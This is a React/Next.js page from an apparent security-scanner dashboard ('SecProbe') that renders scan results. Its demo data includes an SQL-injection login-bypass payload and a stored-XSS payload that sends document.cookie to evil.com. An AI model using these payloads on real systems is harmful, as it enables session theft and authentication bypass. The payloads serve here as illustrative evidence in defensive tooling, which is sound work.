"use client";

import { useState, useEffect, useRef } from "react";
import { useParams } from "next/navigation";
import Link from "next/link";
import {
  ArrowLeft,
  CheckCircle2,
  XCircle,
  Loader2,
  Download,
  ChevronDown,
  ChevronRight,
  ExternalLink,
  FileJson,
  FileText,
  FileCode,
  Terminal,
} from "lucide-react";
import SeverityBarChart from "@/components/SeverityBarChart";
import { severityBadgeClass, severityColor } from "@/lib/api";
import type { Finding } from "@/lib/api";

// Demo data for scan results
const demoScan = {
  id: "scan-001",
  target: "https://app.example.com",
  status: "complete" as string,
  mode: "audit",
  started_at: "2026-03-31T10:00:00Z",
  completed_at: "2026-03-31T10:42:00Z",
  findings: [
    {
      id: "f-1",
      title: "SQL Injection in Login Endpoint",
      severity: "critical" as const,
      description:
        "The /api/auth/login endpoint is vulnerable to SQL injection through the username parameter. An attacker can bypass authentication or extract database contents.",
      evidence:
        "Parameter: username\nPayload: admin' OR '1'='1' --\nResponse: 200 OK with admin session token",
      recommendation:
        "Use parameterized queries or prepared statements. Never concatenate user input directly into SQL queries.",
      cwe: "CWE-89",
      agent: "SQLi-Hunter-Alpha",
      division: "Injection",
    },
    {
      id: "f-2",
      title: "Stored XSS in User Profile",
      severity: "high" as const,
      description:
        "The bio field in user profiles allows script injection that executes when other users view the profile page.",
      evidence:
        'Input: <script>document.location="https://evil.com/?c="+document.cookie</script>\nResult: Script executed in victim browser context',
      recommendation:
        "Implement output encoding for all user-generated content. Use Content-Security-Policy headers.",
      cwe: "CWE-79",
      agent: "XSS-Probe-Beta",
      division: "XSS",
    },
    {
      id: "f-3",
      title: "Missing Rate Limiting on API",
      severity: "medium" as const,
      description:
        "The /api/v2/ endpoints lack rate limiting, allowing unlimited requests that could lead to denial of service or brute force attacks.",
      evidence:
        "Sent 10,000 requests in 60 seconds with no throttling detected.",
      recommendation:
        "Implement rate limiting using token bucket or sliding window algorithm. Return 429 status codes when limits are exceeded.",
      cwe: "CWE-770",
      agent: "RateLimit-Scanner",
      division: "Rate Limiting",
    },
    {
      id: "f-4",
      title: "Insecure Direct Object Reference",
      severity: "high" as const,
      description:
        "User documents can be accessed by modifying the document ID parameter without proper authorization checks.",
      evidence:
        "GET /api/documents/1234 returns document belonging to another user.",
      recommendation:
        "Implement proper authorization checks that verify the requesting user owns or has access to the requested resource.",
      cwe: "CWE-639",
      agent: "AuthZ-Checker-Gamma",
      division: "Authorization",
    },
    {
      id: "f-5",
      title: "Server Version Disclosure",
      severity: "low" as const,
      description:
        "Server response headers reveal the web server version and technology stack.",
      evidence:
        'Header: Server: nginx/1.24.0\nHeader: X-Powered-By: Express 4.18.2',
      recommendation:
        "Remove or obfuscate server version headers. Configure web server to suppress version information.",
      cwe: "CWE-200",
      agent: "InfoDisc-Scanner",
      division: "Information Disclosure",
    },
    {
      id: "f-6",
      title: "Cookie Missing Secure Flag",
      severity: "medium" as const,
      description:
        "Session cookies are set without the Secure flag, allowing transmission over unencrypted HTTP connections.",
      evidence:
        "Set-Cookie: session=abc123; Path=/; HttpOnly (missing Secure flag)",
      recommendation:
        "Add the Secure flag to all session cookies to ensure they are only sent over HTTPS connections.",
      cwe: "CWE-614",
      agent: "Session-Auditor",
      division: "Session Management",
    },
    {
      id: "f-7",
      title: "TLS 1.0 Supported",
      severity: "info" as const,
      description:
        "The server supports TLS 1.0 which is deprecated and has known vulnerabilities.",
      evidence: "TLS handshake succeeded with TLS 1.0 protocol.",
      recommendation:
        "Disable TLS 1.0 and 1.1. Only support TLS 1.2 and TLS 1.3.",
      cwe: "CWE-326",
      agent: "Crypto-Auditor",
      division: "Cryptography",
    },
  ] as Finding[],
  summary: {
    total_findings: 7,
    critical: 1,
    high: 2,
    medium: 2,
    low: 1,
    info: 1,
    duration_seconds: 2520,
  },
};

const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };

const severityLeftBorder: Record<string, string> = {
  critical: "#ff1744",
  high: "#ff9100",
  medium: "#ffea00",
  low: "#00e5ff",
  info: "#69f0ae",
};

function StatusIcon({ status }: { status: string }) {
  switch (status) {
    case "complete":
      return <CheckCircle2 className="h-5 w-5 text-[#69f0ae]" style={{ filter: "drop-shadow(0 0 4px rgba(105, 240, 174, 0.4))" }} />;
    case "failed":
      return <XCircle className="h-5 w-5 text-[#ff1744]" style={{ filter: "drop-shadow(0 0 4px rgba(255, 23, 68, 0.4))" }} />;
    case "running":
      return <Loader2 className="h-5 w-5 text-[#00e5ff] animate-spin" style={{ filter: "drop-shadow(0 0 4px rgba(0, 229, 255, 0.4))" }} />;
    default:
      return null;
  }
}

function FindingCard({
  finding,
  isOpen,
  onToggle,
}: {
  finding: Finding;
  isOpen: boolean;
  onToggle: () => void;
}) {
  const borderColor = severityLeftBorder[finding.severity] || "#69f0ae";

  return (
    <div
      className="rounded-lg overflow-hidden transition-all duration-300"
      style={{
        background: "rgba(12, 12, 24, 0.5)",
        border: "1px solid rgba(255,255,255,0.05)",
        borderLeft: `3px solid ${borderColor}`,
        boxShadow: isOpen ? `inset 3px 0 10px ${borderColor}10` : "none",
      }}
    >
      <button
        onClick={onToggle}
        className="w-full flex items-center gap-3 px-4 py-3.5 transition-all duration-200 text-left hover:bg-white/[0.02]"
      >
        {isOpen ? (
          <ChevronDown className="h-4 w-4 text-zinc-600 flex-shrink-0" />
        ) : (
          <ChevronRight className="h-4 w-4 text-zinc-600 flex-shrink-0" />
        )}
        <span
          className={`inline-flex items-center px-2 py-0.5 rounded text-[10px] font-mono font-bold border ${severityBadgeClass(finding.severity)}`}
        >
          {finding.severity.toUpperCase()}
        </span>
        <span className="text-sm text-zinc-300 flex-1">{finding.title}</span>
        {finding.cwe && (
          <span className="text-[11px] text-zinc-600 font-mono hidden sm:inline">
            {finding.cwe}
          </span>
        )}
      </button>

      <div
        className="overflow-hidden transition-all duration-300"
        style={{
          maxHeight: isOpen ? "600px" : "0",
          opacity: isOpen ? 1 : 0,
        }}
      >
        <div className="px-4 pb-4 pt-1 border-t border-white/5 space-y-4">
          <div>
            <h4 className="text-[10px] font-mono text-zinc-600 uppercase tracking-wider mb-1.5">
              Description
            </h4>
            <p className="text-sm text-zinc-400 leading-relaxed">{finding.description}</p>
          </div>

          {finding.evidence && (
            <div>
              <h4 className="text-[10px] font-mono text-zinc-600 uppercase tracking-wider mb-1.5">
                Evidence
              </h4>
              <pre
                className="text-xs text-zinc-400 rounded-lg p-4 overflow-x-auto font-mono whitespace-pre-wrap leading-relaxed"
                style={{
                  background: "rgba(0, 0, 0, 0.4)",
                  border: "1px solid rgba(99, 102, 241, 0.1)",
                }}
              >
                {finding.evidence}
              </pre>
            </div>
          )}

          {finding.recommendation && (
            <div>
              <h4 className="text-[10px] font-mono text-zinc-600 uppercase tracking-wider mb-1.5">
                Recommendation
              </h4>
              <p className="text-sm text-zinc-400 leading-relaxed">{finding.recommendation}</p>
            </div>
          )}

          <div className="flex flex-wrap gap-4 pt-2">
            {finding.cwe && (
              <a
                href={`https://cwe.mitre.org/data/definitions/${finding.cwe.replace("CWE-", "")}.html`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-1 text-[11px] text-accent hover:text-accent-hover font-mono transition-colors"
              >
                {finding.cwe} <ExternalLink className="h-3 w-3" />
              </a>
            )}
            {finding.agent && (
              <span className="text-[11px] text-zinc-600 font-mono">
                Agent: <span className="text-zinc-500">{finding.agent}</span>
              </span>
            )}
            {finding.division && (
              <span className="text-[11px] text-zinc-600 font-mono">
                Division: <span className="text-zinc-500">{finding.division}</span>
              </span>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

export default function ScanResultsPage() {
  const params = useParams();
  const scanId = params.id as string;
  const [scan, setScan] = useState({ ...demoScan, id: scanId });
  const [loading, setLoading] = useState(true);
  const [termLogs, setTermLogs] = useState<string[]>([]);
  const termRef = useRef<HTMLDivElement>(null);
  const prevFindingCount = useRef(0);

  function addLog(line: string) {
    const ts = new Date().toLocaleTimeString("en-US", { hour12: false });
    setTermLogs((prev) => [...prev, `[${ts}] ${line}`]);
  }

  useEffect(() => {
    let pollId: ReturnType<typeof setInterval> | undefined;

    addLog(`SecProbe v8.0 — Initializing scan ${scanId}`);
    addLog(`Connecting to backend...`);

    async function fetchScan() {
      try {
        const API = process.env.NEXT_PUBLIC_API_URL || "https://feisty-reflection-production.up.railway.app";
        const res = await fetch(`${API}/scans/${scanId}`);
        if (res.ok) {
          const data = await res.json();
          const findings = (data.findings || []).map((f: Record<string, string>, i: number) => ({
            id: `f-${i}`,
            title: f.title || "Unknown",
            severity: (f.severity || "info").toLowerCase(),
            description: f.description || "",
            evidence: f.evidence || "",
            recommendation: f.recommendation || "",
            cwe: f.cwe || "",
            agent: f.agent || "",
            division: f.division || "",
          }));
          const summary = {
            total_findings: findings.length,
            critical: findings.filter((f: Finding) => f.severity === "critical").length,
            high: findings.filter((f: Finding) => f.severity === "high").length,
            medium: findings.filter((f: Finding) => f.severity === "medium").length,
            low: findings.filter((f: Finding) => f.severity === "low").length,
            info: findings.filter((f: Finding) => f.severity === "info").length,
            duration_seconds: data.duration || 0,
          };
          // Generate terminal logs for new findings
          if (findings.length > prevFindingCount.current) {
            const newFindings = findings.slice(prevFindingCount.current);
            for (const f of newFindings) {
              const sevColor = f.severity === "critical" ? "\x1b[31m" : f.severity === "high" ? "\x1b[33m" : "";
              addLog(`[${f.severity.toUpperCase()}] Found: ${f.title}`);
              if (f.cwe) addLog(`  └─ ${f.cwe} | ${f.evidence?.slice(0, 80) || ""}`);
            }
            prevFindingCount.current = findings.length;
          }

          if (data.status === "running") {
            addLog(`⟳ Scanning... ${Math.round((data.progress || 0) * 100)}% | ${findings.length} findings`);
          } else if (data.status === "complete" && prevFindingCount.current > 0) {
            addLog(`✓ Scan complete — ${findings.length} findings discovered`);
            addLog(`  Risk: ${summary.critical} critical, ${summary.high} high, ${summary.medium} medium, ${summary.low} low`);
          }

          setScan({
            id: data.scan_id || scanId,
            target: data.target || "unknown",
            status: data.status || "complete",
            mode: data.mode || "audit",
            started_at: data.created_at || new Date().toISOString(),
            completed_at: data.completed_at || new Date().toISOString(),
            findings,
            summary,
          });
          // If scan is still running, keep polling every 2s
          if (data.status === "running" || data.status === "queued") {
            if (!pollId) {
              pollId = setInterval(fetchScan, 2000);
            }
          } else if (pollId) {
            clearInterval(pollId);
            pollId = undefined;
          }
        }
      } catch (_err) {
        // Keep demo data as fallback
      } finally {
        setLoading(false);
      }
    }
    fetchScan();
    return () => { if (pollId) clearInterval(pollId); };
  }, [scanId]);

  // Auto-scroll terminal
  useEffect(() => {
    if (termRef.current) {
      termRef.current.scrollTop = termRef.current.scrollHeight;
    }
  }, [termLogs]);

  const [expandedFindings, setExpandedFindings] = useState<Set<string>>(
    new Set()
  );

  function toggleFinding(id: string) {
    setExpandedFindings((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  }

  function expandAll() {
    setExpandedFindings(new Set(scan.findings.map((f) => f.id)));
  }

  function collapseAll() {
    setExpandedFindings(new Set());
  }

  const sortedFindings = [...scan.findings].sort(
    (a, b) =>
      (severityOrder[a.severity] ?? 5) - (severityOrder[b.severity] ?? 5)
  );

  const chartData = [
    { name: "Critical", count: scan.summary.critical, color: severityColor("critical") },
    { name: "High", count: scan.summary.high, color: severityColor("high") },
    { name: "Medium", count: scan.summary.medium, color: severityColor("medium") },
    { name: "Low", count: scan.summary.low, color: severityColor("low") },
    { name: "Info", count: scan.summary.info, color: severityColor("info") },
  ];

  function exportData(format: string) {
    const content =
      format === "json"
        ? JSON.stringify(scan, null, 2)
        : format === "sarif"
          ? JSON.stringify(
              {
                $schema:
                  "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
                version: "2.1.0",
                runs: [
                  {
                    tool: { driver: { name: "SecProbe", version: "1.0.0" } },
                    results: scan.findings.map((f) => ({
                      ruleId: f.cwe || f.id,
                      message: { text: f.description },
                      level:
                        f.severity === "critical" || f.severity === "high"
                          ? "error"
                          : f.severity === "medium"
                            ? "warning"
                            : "note",
                    })),
                  },
                ],
              },
              null,
              2
            )
          : `<html><head><title>SecProbe Report - ${scan.target}</title></head><body><h1>Scan Report</h1><p>Target: ${scan.target}</p><p>Findings: ${scan.summary.total_findings}</p></body></html>`;

    const blob = new Blob([content], { type: "application/octet-stream" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `secprobe-${scan.id}.${format === "sarif" ? "sarif.json" : format}`;
    a.click();
    URL.revokeObjectURL(url);
  }

  const duration = scan.summary.duration_seconds;
  const durationStr = `${Math.floor(duration / 60)}m ${duration % 60}s`;

  return (
    <div className="max-w-5xl mx-auto space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center gap-4">
        <Link
          href="/"
          className="flex items-center gap-2 text-sm text-zinc-600 hover:text-zinc-300 transition-colors font-mono"
        >
          <ArrowLeft className="h-4 w-4" />
          Back to Dashboard
        </Link>
      </div>

      {/* Scan Status */}
      <div className="card scan-line-container">
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
          <div className="flex items-center gap-3">
            <StatusIcon status={scan.status} />
            <div>
              <h1 className="text-xl font-bold text-white">
                Scan {scan.id}
              </h1>
              <p className="text-sm text-zinc-500 font-mono">{scan.target}</p>
            </div>
          </div>
          <div className="flex flex-wrap gap-2">
            {[
              { label: "Mode", value: scan.mode },
              { label: "Duration", value: durationStr },
              { label: "Findings", value: scan.summary.total_findings.toString() },
            ].map((tag) => (
              <span
                key={tag.label}
                className="inline-flex items-center px-2.5 py-1 rounded-lg text-[11px] font-mono"
                style={{
                  background: "rgba(255,255,255,0.03)",
                  border: "1px solid rgba(255,255,255,0.06)",
                  color: "#a1a1aa",
                }}
              >
                <span className="text-zinc-600 mr-1">{tag.label}:</span> {tag.value}
              </span>
            ))}
          </div>
        </div>
      </div>

      {/* Live Terminal */}
      <div className="card overflow-hidden" style={{ border: "1px solid rgba(0, 229, 255, 0.15)" }}>
        <div className="flex items-center gap-2 px-4 py-2 border-b border-zinc-800/50" style={{ background: "rgba(0, 229, 255, 0.03)" }}>
          <Terminal className="h-4 w-4 text-[#00e5ff]" style={{ filter: "drop-shadow(0 0 4px rgba(0, 229, 255, 0.4))" }} />
          <span className="text-xs font-mono font-bold text-[#00e5ff] tracking-wider">SCAN OUTPUT</span>
          <div className="ml-auto flex items-center gap-2">
            {(scan.status === "running" || scan.status === "queued") && (
              <span className="flex items-center gap-1.5 text-[10px] font-mono text-[#69f0ae]">
                <span className="h-1.5 w-1.5 rounded-full bg-[#69f0ae] animate-pulse" />
                LIVE
              </span>
            )}
            <span className="text-[10px] font-mono text-zinc-600">{termLogs.length} lines</span>
          </div>
        </div>
        <div
          ref={termRef}
          className="p-4 font-mono text-xs leading-relaxed overflow-y-auto"
          style={{
            height: "200px",
            background: "rgba(0, 0, 0, 0.4)",
            color: "#a1a1aa",
          }}
        >
          {termLogs.length === 0 ? (
            <span className="text-zinc-700">Waiting for scan data...</span>
          ) : (
            termLogs.map((line, i) => (
              <div
                key={i}
                className="py-0.5"
                style={{
                  color: line.includes("[CRITICAL]")
                    ? "#ff1744"
                    : line.includes("[HIGH]")
                    ? "#ff9100"
                    : line.includes("[MEDIUM]")
                    ? "#ffea00"
                    : line.includes("[LOW]")
                    ? "#00e5ff"
                    : line.includes("✓")
                    ? "#69f0ae"
                    : line.includes("⟳")
                    ? "#6366f1"
                    : line.includes("└─")
                    ? "#52525b"
                    : "#a1a1aa",
                }}
              >
                {line}
              </div>
            ))
          )}
          {(scan.status === "running" || scan.status === "queued") && (
            <div className="py-0.5 text-[#6366f1] animate-pulse">█</div>
          )}
        </div>
      </div>

      {/* Severity Chart + Summary */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="card">
          <h2 className="text-sm font-semibold text-white mb-4 uppercase tracking-wider">
            Severity Distribution
          </h2>
          <SeverityBarChart data={chartData} />
        </div>
        <div className="card space-y-4">
          <h2 className="text-sm font-semibold text-white uppercase tracking-wider">Summary</h2>
          <div className="grid grid-cols-2 gap-3">
            {chartData.map((item) => (
              <div
                key={item.name}
                className="flex items-center justify-between p-3 rounded-lg transition-all duration-200 hover:scale-[1.02]"
                style={{
                  background: `${item.color}08`,
                  border: `1px solid ${item.color}15`,
                }}
              >
                <div className="flex items-center gap-2">
                  <span
                    className="h-2.5 w-2.5 rounded-full"
                    style={{ backgroundColor: item.color, boxShadow: `0 0 6px ${item.color}40` }}
                  />
                  <span className="text-xs text-zinc-500 font-mono">{item.name}</span>
                </div>
                <span className="text-lg font-bold text-white font-mono">
                  {item.count}
                </span>
              </div>
            ))}
          </div>
          {/* Export */}
          <div className="pt-3 border-t border-white/5">
            <p className="text-[10px] text-zinc-600 mb-2.5 font-mono uppercase tracking-wider">Export Report</p>
            <div className="flex gap-2">
              {[
                { format: "json", icon: FileJson, label: "JSON" },
                { format: "html", icon: FileText, label: "HTML" },
                { format: "sarif", icon: FileCode, label: "SARIF" },
              ].map((exp) => (
                <button
                  key={exp.format}
                  onClick={() => exportData(exp.format)}
                  className="flex items-center gap-1.5 text-[11px] font-mono px-3 py-1.5 rounded-lg transition-all duration-200"
                  style={{
                    background: "rgba(255,255,255,0.03)",
                    border: "1px solid rgba(255,255,255,0.06)",
                    color: "#a1a1aa",
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLElement).style.borderColor = "rgba(99, 102, 241, 0.3)";
                    (e.target as HTMLElement).style.color = "#e4e4e7";
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLElement).style.borderColor = "rgba(255,255,255,0.06)";
                    (e.target as HTMLElement).style.color = "#a1a1aa";
                  }}
                >
                  <Download className="h-3 w-3" /> {exp.label}
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Findings List */}
      <div className="card">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-sm font-semibold text-white uppercase tracking-wider">
            Findings
          </h2>
          <div className="flex gap-3">
            <button
              onClick={expandAll}
              className="text-[11px] text-accent hover:text-accent-hover font-mono transition-colors"
            >
              Expand all
            </button>
            <span className="text-zinc-800">|</span>
            <button
              onClick={collapseAll}
              className="text-[11px] text-zinc-600 hover:text-zinc-400 font-mono transition-colors"
            >
              Collapse all
            </button>
          </div>
        </div>
        <div className="space-y-2">
          {sortedFindings.map((finding) => (
            <FindingCard
              key={finding.id}
              finding={finding}
              isOpen={expandedFindings.has(finding.id)}
              onToggle={() => toggleFinding(finding.id)}
            />
          ))}
        </div>
      </div>
    </div>
  );
}
